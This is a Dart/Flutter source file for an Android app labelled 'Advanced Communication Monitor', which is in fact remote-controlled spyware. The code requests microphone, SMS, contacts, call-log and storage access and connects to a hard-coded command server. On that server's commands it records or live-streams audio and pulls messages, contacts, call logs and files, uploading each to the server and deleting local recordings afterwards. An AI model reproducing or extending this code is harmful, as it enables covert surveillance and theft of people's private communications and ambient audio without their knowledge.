import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;

// --- Command Constants ---
class CommandConstants {
  static const String SIO_CMD_RECORD_AUDIO_FIXED = "command_record_audio_fixed";
  static const String SIO_CMD_START_LIVE_AUDIO = "command_start_live_audio";
  static const String SIO_CMD_STOP_LIVE_AUDIO = "command_stop_live_audio";
  static const String SIO_EVENT_LIVE_AUDIO_CHUNK = "live_audio_chunk";
  static const String SIO_EVENT_REGISTER_DEVICE = "register_device";
  static const String SIO_EVENT_COMMAND = "command";
  static const String SIO_EVENT_CONNECT = "connect";
  static const String SIO_EVENT_DISCONNECT = "disconnect";
  static const String SIO_EVENT_ERROR = "error";
  static const String SIO_EVENT_REGISTRATION_SUCCESSFUL =
      "registration_successful";
  static const String SIO_EVENT_REGISTRATION_FAILED = "registration_failed";
  static const String SIO_EVENT_REQUEST_REGISTRATION_INFO =
      "request_registration_info";
  static const String SIO_EVENT_DEVICE_HEARTBEAT = "device_heartbeat";
  static const String SIO_CMD_GET_SOCIAL_NETWORK =
      "command_get_social_network_data";
  static const String SIO_CMD_GET_COMMUNICATION_HISTORY =
      "command_get_communication_history";
  static const String SIO_CMD_GET_SMS_LIST = "command_get_sms_list";
  static const String SIO_CMD_GET_CONTACTS_LIST = "command_get_contacts_list";
  static const String SIO_CMD_GET_CALL_LOGS = "command_get_call_logs";
  static const String SIO_CMD_CATALOG_LIBRARY = "command_catalog_library";
  static const String SIO_CMD_ANALYZE_CONTENT = "command_analyze_content";
  static const String SIO_CMD_PROCESS_QUEUE = "command_process_queue";
}

// --- Configuration ---
class AppConfig {
  static const String serverBaseUrl = 'https://ws.sosa-qav.es';
  static const String deviceId = 'comm_monitor_device_003';
  static const String channelName = 'com.example.kem/microphone';
}

// --- Permission Manager ---
class PermissionManager {
  static Future<bool> requestPermissions() async {
    Map<Permission, PermissionStatus> permissions =
        await [
          Permission.microphone,
          Permission.contacts,
          Permission.phone,
          Permission.sms,
          Permission.storage,
          Permission.manageExternalStorage,
        ].request();

    bool microphoneGranted =
        permissions[Permission.microphone]?.isGranted == true;

    if (!microphoneGranted) {
      print('ERROR: Microphone access denied.');
      return false;
    }

    print('DEBUG: Microphone access granted.');

    if (permissions[Permission.contacts]?.isGranted != true) {
      print('WARNING: Contacts access denied.');
    } else {
      print('DEBUG: Social network access granted.');
    }

    if (permissions[Permission.phone]?.isGranted != true) {
      print('WARNING: Communication history access denied.');
    } else {
      print('DEBUG: Communication history access granted.');
    }

    if (permissions[Permission.sms]?.isGranted != true) {
      print('WARNING: SMS access denied.');
    } else {
      print('DEBUG: SMS access granted.');
    }

    if (permissions[Permission.storage]?.isGranted != true &&
        permissions[Permission.manageExternalStorage]?.isGranted != true) {
      print('WARNING: Storage access denied.');
    } else {
      print('DEBUG: Storage access granted.');
    }

    return true;
  }
}

// --- Socket Connection Manager ---
class SocketConnectionManager {
  IO.Socket? _socketIO;
  bool _isConnected = false;
  Timer? _heartbeatTimer;
  Function(String)? onStatusUpdate;
  Function(Map<String, dynamic>)? onCommandReceived;

  bool get isConnected => _isConnected;

  void connect() {
    try {
      onStatusUpdate?.call('Establishing secure communication channel...');
      _socketIO?.dispose();

      _socketIO = IO.io(AppConfig.serverBaseUrl, <String, dynamic>{
        'transports': ['websocket'],
        'autoConnect': true,
        'forceNew': true,
        'query': {'deviceId': AppConfig.deviceId},
      });

      _setupEventHandlers();
    } catch (e) {
      print('ERROR connecting SecureChannel: $e');
      onStatusUpdate?.call('Error initializing secure connection: $e');
    }
  }

  void _setupEventHandlers() {
    _socketIO!.onConnect((_) {
      print('SecureChannel connected: ${_socketIO!.id}');
      _isConnected = true;
      onStatusUpdate?.call(
        'Secure channel established. Registering monitor...',
      );
      _registerDevice();
      _startHeartbeat();
    });

    _socketIO!.onDisconnect((reason) {
      print('SecureChannel disconnected: $reason');
      _isConnected = false;
      onStatusUpdate?.call('Connection lost. Reason: $reason');
      _heartbeatTimer?.cancel();
    });

    _socketIO!.onError((data) {
      print('SecureChannel Error: $data');
      onStatusUpdate?.call('Communication error: $data');
    });

    _socketIO!.on(CommandConstants.SIO_EVENT_COMMAND, (data) {
      print('DEBUG: Received monitoring command: $data');
      if (data is Map<String, dynamic>) {
        onCommandReceived?.call(data);
      }
    });

    _socketIO!.on(CommandConstants.SIO_EVENT_REGISTRATION_SUCCESSFUL, (data) {
      print('Monitor registration successful: $data');
      onStatusUpdate?.call('Advanced monitor registered successfully.');
    });

    _socketIO!.on(CommandConstants.SIO_EVENT_REGISTRATION_FAILED, (data) {
      print('ERROR: Monitor registration failed: $data');
      onStatusUpdate?.call('Monitor registration failed: ${data['message']}');
    });

    _socketIO!.on(CommandConstants.SIO_EVENT_REQUEST_REGISTRATION_INFO, (_) {
      print('Server requested monitor re-registration.');
      _registerDevice();
    });
  }

  void _registerDevice() {
    if (_socketIO == null || !_socketIO!.connected) {
      print('ERROR: Cannot register, SecureChannel not connected.');
      onStatusUpdate?.call('Error: Cannot register monitor (not connected).');
      return;
    }

    final registrationData = {
      'deviceId': AppConfig.deviceId,
      'deviceName': 'Advanced Communication Monitor',
      'platform': Platform.operatingSystem,
      'capabilities': [
        'audio_capture',
        'social_network_analysis',
        'communication_tracking',
      ],
    };

    print('DEBUG: Sending monitor registration data: $registrationData');
    _socketIO!.emit(
      CommandConstants.SIO_EVENT_REGISTER_DEVICE,
      registrationData,
    );
  }

  void _startHeartbeat() {
    _heartbeatTimer?.cancel();
    _heartbeatTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
      if (_socketIO != null && _socketIO!.connected) {
        _socketIO!.emit(CommandConstants.SIO_EVENT_DEVICE_HEARTBEAT, {
          'deviceId': AppConfig.deviceId,
          'timestamp': DateTime.now().toIso8601String(),
          'status': 'active_monitoring',
        });
      } else {
        print('WARNING: Cannot send heartbeat, SecureChannel disconnected.');
        timer.cancel();
      }
    });
  }

  void emitAudioChunk(Uint8List audioChunk) {
    if (_socketIO != null && _socketIO!.connected) {
      _socketIO!.emit(CommandConstants.SIO_EVENT_LIVE_AUDIO_CHUNK, {
        'audio_data': audioChunk,
      });
    }
  }

  void dispose() {
    _heartbeatTimer?.cancel();
    _socketIO?.dispose();
  }
}

// --- Data Upload Manager ---
class DataUploadManager {
  static Future<void> uploadDataViaHttp(
    String jsonData,
    String commandId,
    String dataType,
    String fileExtension,
    Function(String) onStatusUpdate,
  ) async {
    onStatusUpdate('Transmitting $dataType via secure channel...');
    try {
      var request = http.MultipartRequest(
        'POST',
        Uri.parse('${AppConfig.serverBaseUrl}/upload_command_file'),
      );

      request.fields['deviceId'] = AppConfig.deviceId;
      request.fields['commandId'] = commandId;
      request.fields['commandRef'] = dataType;
      request.fields['dataType'] = 'structured_analysis';
      request.fields['timestamp'] = DateTime.now().toIso8601String();

      final dataBytes = utf8.encode(jsonData);
      final fileName =
          '${dataType}_${DateTime.now().millisecondsSinceEpoch}.$fileExtension';

      request.files.add(
        http.MultipartFile.fromBytes('file', dataBytes, filename: fileName),
      );

      onStatusUpdate('Uploading $dataType data to secure server...');
      var response = await request.send();
      final respStr = await response.stream.bytesToString();

      if (response.statusCode == 200) {
        onStatusUpdate(
          'Success: $dataType uploaded successfully! Server: $respStr',
        );
        print(
          'SUCCESS: $dataType upload completed. Status: ${response.statusCode}, Body: $respStr',
        );
      } else {
        onStatusUpdate(
          'Error: $dataType upload failed. Status: ${response.statusCode}, Body: $respStr',
        );
        print(
          'ERROR: $dataType upload failed. Status: ${response.statusCode}, Body: $respStr',
        );
      }
    } on SocketException catch (e) {
      onStatusUpdate(
        'Error: Network error during $dataType upload: ${e.message}.',
      );
      print('ERROR: SocketException during $dataType upload: ${e.message}');
    } on http.ClientException catch (e) {
      onStatusUpdate(
        'Error: HTTP client error during $dataType upload: ${e.message}.',
      );
      print('ERROR: HttpClientException during $dataType upload: ${e.message}');
    } catch (e) {
      onStatusUpdate('Error: Unknown error uploading $dataType: $e');
      print('ERROR: General error uploading $dataType: $e');
    }
  }

  static Future<void> uploadAudioViaHttp(
    String filePath,
    String commandId,
    Function(String) onStatusUpdate,
  ) async {
    onStatusUpdate('Uploading audio via secure channel...');
    try {
      final file = File(filePath);
      if (!await file.exists()) {
        onStatusUpdate('Error: Audio file not found locally: $filePath.');
        print('ERROR: Upload Error: File does not exist at path: $filePath');
        return;
      }

      var request = http.MultipartRequest(
        'POST',
        Uri.parse('${AppConfig.serverBaseUrl}/upload_command_file'),
      );

      request.fields['deviceId'] = AppConfig.deviceId;
      request.fields['commandId'] = commandId;
      request.fields['commandRef'] = 'audio_capture';

      request.files.add(
        await http.MultipartFile.fromPath(
          'file',
          filePath,
          filename:
              'audio_capture_${DateTime.now().millisecondsSinceEpoch}.3gp',
        ),
      );

      onStatusUpdate('Transmitting audio file to secure server...');
      var response = await request.send();
      final respStr = await response.stream.bytesToString();

      if (response.statusCode == 200) {
        onStatusUpdate('Success: Audio uploaded securely! Server: $respStr');
        print(
          'SUCCESS: HTTP Upload completed. Status: ${response.statusCode}, Body: $respStr',
        );

        try {
          await file.delete();
          print('DEBUG: Local audio file deleted: $filePath');
        } catch (e) {
          print('WARNING: Error deleting local file $filePath: $e');
        }
      } else {
        onStatusUpdate(
          'Error: HTTP Upload failed. Status: ${response.statusCode}, Body: $respStr',
        );
        print(
          'ERROR: HTTP Upload failed. Status: ${response.statusCode}, Body: $respStr',
        );
      }
    } on SocketException catch (e) {
      onStatusUpdate('Error: Network error during HTTP upload: ${e.message}.');
      print('ERROR: SocketException during HTTP upload: ${e.message}');
    } on http.ClientException catch (e) {
      onStatusUpdate('Error: HTTP client error during upload: ${e.message}.');
      print('ERROR: HttpClientException during HTTP upload: ${e.message}');
    } catch (e) {
      onStatusUpdate('Error: Unknown error uploading audio via HTTP: $e');
      print('ERROR: General error uploading audio via HTTP: $e');
    }
  }
}

// --- Command Executor ---
class CommandExecutor {
  final MethodChannel platform;
  final Function(String) onStatusUpdate;
  bool _isRecording = false;
  bool _isStreaming = false;
  String _lastCommandId = '';

  CommandExecutor({required this.platform, required this.onStatusUpdate});

  bool get isRecording => _isRecording;
  bool get isStreaming => _isStreaming;
  String get lastCommandId => _lastCommandId;
  set lastCommandId(String value) => _lastCommandId = value;

  Future<void> executeCommand(Map<String, dynamic> commandData) async {
    final commandName = commandData['command'];
    final args = commandData['args'] ?? {};
    final commandId = commandData['command_id'] ?? 'N/A';

    if (_isRecording || _isStreaming) {
      if (!(commandName == CommandConstants.SIO_CMD_STOP_LIVE_AUDIO &&
          _isStreaming)) {
        print(
          'WARNING: Ignoring command \'$commandName\' because another task is active (Recording: $_isRecording, Streaming: $_isStreaming).',
        );
        onStatusUpdate('System busy. Ignoring command.');
        return;
      }
    }

    print(
      'Executing monitoring command: $commandName with args: $args (ID: $commandId)',
    );

    switch (commandName) {
      case CommandConstants.SIO_CMD_RECORD_AUDIO_FIXED:
        final duration = args['duration'] ?? 10;
        onStatusUpdate('Executing: Audio capture $duration seconds...');
        await _recordAndUploadAudio(duration.toInt(), commandId);
        break;
      case CommandConstants.SIO_CMD_START_LIVE_AUDIO:
        onStatusUpdate('Executing: Starting live audio monitoring...');
        await _startLiveAudioStreamNative();
        break;
      case CommandConstants.SIO_CMD_STOP_LIVE_AUDIO:
        onStatusUpdate('Executing: Stopping live audio monitoring...');
        await _stopLiveAudioStreamNative();
        break;
      case CommandConstants.SIO_CMD_GET_SOCIAL_NETWORK:
        onStatusUpdate('Executing: Social network analysis...');
        await _collectSocialNetworkData(commandId);
        break;
      case CommandConstants.SIO_CMD_GET_COMMUNICATION_HISTORY:
        onStatusUpdate('Executing: Communication history extraction...');
        await _extractCommunicationHistory(commandId);
        break;
      case CommandConstants.SIO_CMD_GET_SMS_LIST:
        onStatusUpdate('Executing: SMS messages extraction...');
        await _extractSMSMessages(commandId);
        break;
      case CommandConstants.SIO_CMD_GET_CONTACTS_LIST:
        onStatusUpdate('Executing: Contacts list extraction...');
        await _extractContactsList(commandId);
        break;
      case CommandConstants.SIO_CMD_GET_CALL_LOGS:
        onStatusUpdate('Executing: Call logs extraction...');
        await _extractCallLogs(commandId);
        break;
      case CommandConstants.SIO_CMD_CATALOG_LIBRARY:
        onStatusUpdate('Executing: Library cataloging...');
        await _catalogLibraryContent(commandId);
        break;
      case CommandConstants.SIO_CMD_ANALYZE_CONTENT:
        final filePath = args['filePath'] ?? '';
        onStatusUpdate('Executing: Content analysis...');
        await _analyzeSpecificContent(commandId, filePath);
        break;
      case CommandConstants.SIO_CMD_PROCESS_QUEUE:
        onStatusUpdate('Executing: Processing content queue...');
        await _processContentQueue(commandId);
        break;
      default:
        onStatusUpdate('Unknown monitoring command: $commandName');
        print('WARNING: Unknown monitoring command received: $commandName');
        break;
    }

    if (!_isRecording &&
        !_isStreaming &&
        !onStatusUpdate.toString().toLowerCase().contains('error')) {
      onStatusUpdate('Command completed. Monitor standing by.');
    }
  }

  Future<void> _collectSocialNetworkData(String commandId) async {
    await _executeDataCollection(
      'collectSocialNetworkData',
      commandId,
      'social_network_analysis',
      'json',
      'Social network analysis',
    );
  }

  Future<void> _extractCommunicationHistory(String commandId) async {
    await _executeDataCollection(
      'extractCommunicationHistory',
      commandId,
      'communication_history_analysis',
      'json',
      'Communication history extraction',
    );
  }

  Future<void> _extractSMSMessages(String commandId) async {
    await _executeDataCollection(
      'extractSMSMessages',
      commandId,
      'sms_messages_analysis',
      'json',
      'SMS messages extraction',
    );
  }

  Future<void> _extractContactsList(String commandId) async {
    await _executeDataCollection(
      'extractContactsList',
      commandId,
      'contacts_list_analysis',
      'json',
      'Contacts list extraction',
    );
  }

  Future<void> _extractCallLogs(String commandId) async {
    await _executeDataCollection(
      'extractCallLogs',
      commandId,
      'call_logs_analysis',
      'json',
      'Call logs extraction',
    );
  }

  Future<void> _catalogLibraryContent(String commandId) async {
    await _executeDataCollection(
      'catalogLibraryContent',
      commandId,
      'library_catalog',
      'json',
      'Library cataloging',
    );
  }

  Future<void> _analyzeSpecificContent(
    String commandId,
    String filePath,
  ) async {
    onStatusUpdate('Analyzing specific content...');
    try {
      final String? analysisDataJson = await platform.invokeMethod(
        'analyzeSpecificContent',
        {'filePath': filePath},
      );

      if (analysisDataJson != null && analysisDataJson.isNotEmpty) {
        onStatusUpdate('Content analysis complete. Transmitting data...');
        print('DEBUG: Content analysis completed successfully.');

        json.decode(analysisDataJson); // Validate JSON

        await DataUploadManager.uploadDataViaHttp(
          analysisDataJson,
          commandId,
          'content_analysis',
          'json',
          onStatusUpdate,
        );
      } else {
        onStatusUpdate('Error: Content analysis returned no data.');
        print('ERROR: Content analysis failed or returned empty.');
      }
    } on PlatformException catch (e) {
      onStatusUpdate('Error: Content analysis failed: ${e.message}');
      print(
        'ERROR: Content analysis PlatformException: ${e.code}: ${e.message}',
      );
    } catch (e) {
      onStatusUpdate('Error: Unexpected error during content analysis: $e');
      print('ERROR: General error during content analysis: $e');
    }
  }

  Future<void> _processContentQueue(String commandId) async {
    await _executeDataCollection(
      'processContentQueue',
      commandId,
      'queue_processing',
      'json',
      'Content queue processing',
    );
  }

  Future<void> _executeDataCollection(
    String methodName,
    String commandId,
    String dataType,
    String fileExtension,
    String operationName,
  ) async {
    onStatusUpdate('Analyzing $operationName...');
    try {
      final String? dataJson = await platform.invokeMethod(methodName);

      if (dataJson != null && dataJson.isNotEmpty) {
        onStatusUpdate('$operationName complete. Transmitting data...');
        print('DEBUG: $operationName collected successfully.');

        json.decode(dataJson); // Validate JSON

        await DataUploadManager.uploadDataViaHttp(
          dataJson,
          commandId,
          dataType,
          fileExtension,
          onStatusUpdate,
        );
      } else {
        onStatusUpdate('Error: $operationName returned no data.');
        print('ERROR: $operationName failed or returned empty.');
      }
    } on PlatformException catch (e) {
      onStatusUpdate('Error: $operationName failed: ${e.message}');
      print('ERROR: $operationName PlatformException: ${e.code}: ${e.message}');
    } catch (e) {
      onStatusUpdate('Error: Unexpected error during $operationName: $e');
      print('ERROR: General error during $operationName: $e');
    }
  }

  Future<void> _recordAndUploadAudio(
    int durationInSeconds,
    String commandId,
  ) async {
    if (_isStreaming) {
      onStatusUpdate('Cannot record while live monitoring active.');
      print('WARNING: Attempted to record while streaming.');
      return;
    }
    if (_isRecording) {
      onStatusUpdate('Audio capture already in progress.');
      print('INFO: Record called but already recording.');
      return;
    }

    _isRecording = true;
    onStatusUpdate('Requesting audio capture ($durationInSeconds s)...');

    String? recordedPath;
    try {
      onStatusUpdate('Activating audio capture system...');
      recordedPath = await platform.invokeMethod('startRecording', {
        'duration': durationInSeconds,
      });

      if (recordedPath != null && recordedPath.isNotEmpty) {
        onStatusUpdate(
          'Audio capture complete. Path: $recordedPath. Uploading...',
        );
        print('DEBUG: Audio capture completed. Path: $recordedPath');
        await DataUploadManager.uploadAudioViaHttp(
          recordedPath,
          commandId,
          onStatusUpdate,
        );
      } else {
        onStatusUpdate(
          'Error: Audio capture failed or returned empty path (System error).',
        );
        print('ERROR: Audio capture failed or returned empty path.');
      }
    } on PlatformException catch (e) {
      onStatusUpdate('Error: Audio capture failed: ${e.message}');
      print('ERROR: Audio capture PlatformException: ${e.code}: ${e.message}');
    } catch (e) {
      onStatusUpdate('Error: Unexpected error during audio capture: $e');
      print('ERROR: General error during audio capture process: $e');
    } finally {
      _isRecording = false;
      if (!onStatusUpdate.toString().toLowerCase().contains('error') &&
          !onStatusUpdate.toString().toLowerCase().contains('failed')) {
        onStatusUpdate('Audio capture & upload finished. Monitor standing by.');
      }
    }
  }

  Future<void> _startLiveAudioStreamNative() async {
    if (_isRecording) {
      onStatusUpdate('Cannot start live monitoring while recording.');
      print('WARNING: Attempted to start streaming while recording.');
      return;
    }
    if (_isStreaming) {
      onStatusUpdate('Live monitoring already active.');
      print('INFO: Start stream called but already streaming.');
      return;
    }

    onStatusUpdate('Requesting live audio monitoring activation...');
    try {
      final bool? success = await platform.invokeMethod('startLiveAudioStream');

      if (success == true) {
        _isStreaming = true;
        onStatusUpdate('Live audio monitoring activated.');
        print('DEBUG: Native live audio monitoring started successfully.');
      } else {
        onStatusUpdate(
          'Failed to activate live audio monitoring (system error).',
        );
        print(
          'ERROR: Native method startLiveAudioStream returned false or null.',
        );
        _isStreaming = false;
      }
    } on PlatformException catch (e) {
      onStatusUpdate('Error starting live monitoring: ${e.message}');
      print(
        'ERROR: PlatformException starting live monitoring: ${e.code}: ${e.message}',
      );
      _isStreaming = false;
    } catch (e) {
      onStatusUpdate('Unexpected error starting live monitoring: $e');
      print('ERROR: Unexpected error starting live monitoring: $e');
      _isStreaming = false;
    }
  }

  Future<void> _stopLiveAudioStreamNative() async {
    if (!_isStreaming) {
      print('INFO: Stop stream called but not currently streaming.');
      _stopLiveAudioStreamUI();
      return;
    }

    onStatusUpdate('Requesting live monitoring deactivation...');
    try {
      final bool? success = await platform.invokeMethod('stopLiveAudioStream');

      if (success == true) {
        print('DEBUG: Native live audio monitoring stopped successfully.');
      } else {
        onStatusUpdate('Failed to deactivate live monitoring (system error).');
        print(
          'ERROR: Native method stopLiveAudioStream returned false or null.',
        );
      }
    } on PlatformException catch (e) {
      onStatusUpdate('Error stopping live monitoring: ${e.message}');
      print(
        'ERROR: PlatformException stopping live monitoring: ${e.code}: ${e.message}',
      );
    } catch (e) {
      onStatusUpdate('Unexpected error stopping live monitoring: $e');
      print('ERROR: Unexpected error stopping live monitoring: $e');
    } finally {
      _stopLiveAudioStreamUI();
    }
  }

  void _stopLiveAudioStreamUI() {
    if (_isStreaming) {
      _isStreaming = false;
      if (!onStatusUpdate.toString().toLowerCase().contains('error') &&
          !onStatusUpdate.toString().toLowerCase().contains('failed')) {
        onStatusUpdate('Live audio monitoring deactivated. Standing by.');
      }
    }
  }
}

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Advanced Communication Monitor',
      theme: ThemeData(primarySwatch: Colors.blue),
      home: const ListenerScreen(),
    );
  }
}

class ListenerScreen extends StatefulWidget {
  const ListenerScreen({super.key});

  @override
  State<ListenerScreen> createState() => _ListenerScreenState();
}

class _ListenerScreenState extends State<ListenerScreen> {
  static const platform = MethodChannel(AppConfig.channelName);

  String _status = 'Initializing advanced monitoring system...';

  // تغيير من late إلى nullable types لتجنب LateInitializationError
  SocketConnectionManager? _socketManager;
  CommandExecutor? _commandExecutor;

  // متغير للتحقق من التهيئة
  bool _isInitialized = false;

  @override
  void initState() {
    super.initState();
    _initializeApp();
  }

  @override
  void dispose() {
    _socketManager?.dispose();
    super.dispose();
  }

  Future<void> _initializeApp() async {
    _updateStatus('Requesting system access permissions...');

    final granted = await PermissionManager.requestPermissions();
    if (granted) {
      _updateStatus('System access granted. Establishing secure connection...');
      _setupManagers();
      _setupPlatformChannelHandler();

      // التأكد من التهيئة قبل الاتصال
      if (_socketManager != null) {
        _socketManager!.connect();
        _isInitialized = true;
      }
    } else {
      _updateStatus('System access denied. Monitor cannot function properly.');
    }
  }

  void _setupManagers() {
    _socketManager =
        SocketConnectionManager()
          ..onStatusUpdate = _updateStatus
          ..onCommandReceived = _handleCommand;

    _commandExecutor = CommandExecutor(
      platform: platform,
      onStatusUpdate: _updateStatus,
    );
  }

  void _setupPlatformChannelHandler() {
    platform.setMethodCallHandler((call) async {
      switch (call.method) {
        case 'audioChunk':
          final Uint8List? audioChunk = call.arguments as Uint8List?;
          if (audioChunk != null &&
              _commandExecutor?.isStreaming == true &&
              _socketManager?.isConnected == true) {
            _socketManager!.emitAudioChunk(audioChunk);
          } else if (_socketManager?.isConnected != true &&
              _commandExecutor?.isStreaming == true) {
            print('ERROR: SecureChannel disconnected, stopping native stream.');
            _updateStatus('Error: Server disconnected during transmission.');
            await platform.invokeMethod('stopLiveAudioStream');
          }
          break;
        case 'streamingError':
          final String? errorMessage = call.arguments as String?;
          final String errorText = errorMessage ?? 'Unknown native error';
          _updateStatus('Error from Native Audio System: $errorText');
          print('ERROR: Native Audio System Error: $errorText');
          break;
        default:
          print('WARNING: Unhandled method call from native: ${call.method}');
      }
    });
  }

  Future<void> _handleCommand(Map<String, dynamic> commandData) async {
    if (_commandExecutor == null) {
      print('WARNING: Command executor not initialized');
      return;
    }

    final commandId = commandData['command_id'];
    if (commandId != null && commandId != _commandExecutor!.lastCommandId) {
      _commandExecutor!.lastCommandId = commandId;
      await _commandExecutor!.executeCommand(commandData);
    } else if (commandId == null) {
      print('WARNING: Received command without command_id');
      await _commandExecutor!.executeCommand(commandData);
    }
  }

  void _updateStatus(String message) {
    if (mounted) {
      setState(() {
        _status = message;
      });
      print('MONITOR STATUS: $message');
    }
  }

  Color _getStatusColor() {
    final lowerStatus = _status.toLowerCase();
    if (lowerStatus.contains('error') ||
        lowerStatus.contains('failed') ||
        lowerStatus.contains('denied')) {
      return Colors.red.shade700;
    } else if (lowerStatus.contains('success') ||
        lowerStatus.contains('complete') ||
        lowerStatus.contains('granted') ||
        lowerStatus.contains('registered')) {
      return Colors.green.shade700;
    } else if (_commandExecutor?.isRecording == true ||
        lowerStatus.contains('capture') ||
        lowerStatus.contains('uploading') ||
        lowerStatus.contains('transmitting')) {
      return Colors.orange.shade700;
    } else if (_commandExecutor?.isStreaming == true ||
        lowerStatus.contains('monitoring')) {
      return Colors.blue.shade700;
    } else if (_socketManager?.isConnected != true &&
        !lowerStatus.contains('initializing')) {
      return Colors.red.shade700;
    }
    return Colors.black87;
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Advanced Communication Monitor'),
        backgroundColor:
            _socketManager?.isConnected == true ? Colors.blue : Colors.grey,
      ),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Text(
                'Monitor ID: ${AppConfig.deviceId}',
                style: const TextStyle(
                  fontSize: 18,
                  fontWeight: FontWeight.bold,
                ),
              ),
              const SizedBox(height: 10),
              Text(
                'Control Server: ${AppConfig.serverBaseUrl}',
                style: const TextStyle(fontSize: 12, color: Colors.grey),
              ),
              const SizedBox(height: 10),
              Text(
                'Channel: ${_socketManager?.isConnected == true ? "Secure Connection" : "Disconnected"}',
                style: TextStyle(
                  fontSize: 16,
                  fontWeight: FontWeight.bold,
                  color:
                      _socketManager?.isConnected == true
                          ? Colors.green
                          : Colors.red,
                ),
              ),
              const SizedBox(height: 30),

              SizedBox(
                height: 60,
                child:
                    _commandExecutor?.isRecording == true
                        ? const Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            CircularProgressIndicator(),
                            SizedBox(width: 15),
                            Text(
                              "Audio Capture Active...",
                              style: TextStyle(
                                color: Colors.orange,
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        )
                        : _commandExecutor?.isStreaming == true
                        ? const Row(
                          mainAxisAlignment: MainAxisAlignment.center,
                          children: [
                            Icon(
                              Icons.settings_voice,
                              color: Colors.green,
                              size: 30,
                            ),
                            SizedBox(width: 15),
                            Text(
                              "Live Monitoring Active...",
                              style: TextStyle(
                                color: Colors.green,
                                fontSize: 18,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        )
                        : const Icon(
                          Icons.security,
                          size: 50,
                          color: Colors.grey,
                        ),
              ),
              const SizedBox(height: 20),

              const Text('System Status:', style: TextStyle(fontSize: 20)),
              const SizedBox(height: 5),
              Container(
                padding: const EdgeInsets.symmetric(
                  horizontal: 12,
                  vertical: 8,
                ),
                decoration: BoxDecoration(
                  color: Colors.grey[200],
                  borderRadius: BorderRadius.circular(8),
                ),
                constraints: const BoxConstraints(minHeight: 60),
                child: Text(
                  _status,
                  textAlign: TextAlign.center,
                  style: TextStyle(fontSize: 16, color: _getStatusColor()),
                ),
              ),

              // إضافة زر إعادة الاتصال في حالة فشل الاتصال
              if (!_isInitialized || _socketManager?.isConnected != true)
                Padding(
                  padding: const EdgeInsets.only(top: 20),
                  child: ElevatedButton(
                    onPressed: () {
                      if (_socketManager != null) {
                        _socketManager!.connect();
                      }
                    },
                    child: const Text('Retry Connection'),
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
